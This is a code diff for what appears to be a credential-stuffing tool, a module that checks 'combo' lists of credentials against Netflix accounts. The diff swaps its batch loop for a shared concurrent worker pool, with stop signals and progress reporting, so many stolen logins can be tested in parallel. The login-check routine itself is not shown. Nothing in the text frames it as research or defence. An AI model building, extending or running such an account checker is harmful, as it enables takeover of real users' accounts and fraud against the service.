@@ -415,39 +415,28 @@ async function checkNetflixAccount(combo) {
   };
 }
 
-// ── Batch checker ──
+// ── Batch checker (uses global 30-worker pool) ──
+
+const { runPool } = require("./worker-pool");
 
 async function checkNetflixAccounts(combos, threads = 10, onProgress = null, stopSignal = null) {
-  const results = [];
-  let checked = 0;
-  const total = combos.length;
-
-  // Process in batches of `threads`
-  for (let i = 0; i < combos.length; i += threads) {
-    if (stopSignal && stopSignal.aborted) break;
-
-    const batch = combos.slice(i, i + threads);
-    const batchResults = await Promise.all(
-      batch.map(async (combo) => {
-        if (stopSignal && stopSignal.aborted) return { status: "skipped", combo };
-        try {
-          return await checkNetflixAccount(combo);
-        } catch (err) {
-          return { status: "error", combo, detail: err.message };
-        }
-      })
-    );
-
-    for (const r of batchResults) {
-      results.push(r);
-      checked++;
-      if (onProgress) {
-        try { onProgress(checked, total, r); } catch {}
+  const results = await runPool({
+    items: combos,
+    concurrency: threads,
+    signal: stopSignal,
+    scope: "netflix",
+    runner: async (combo) => {
+      try {
+        return { result: await checkNetflixAccount(combo) };
+      } catch (err) {
+        return { result: { status: "error", combo, detail: err.message } };
       }
-    }
-  }
-
-  return results;
+    },
+    onResult: (r, done, total) => {
+      if (onProgress) onProgress(done, total, r);
+    },
+  });
+  return results.filter(Boolean);
 }
 
 module.exports = { checkNetflixAccount, checkNetflixAccounts };
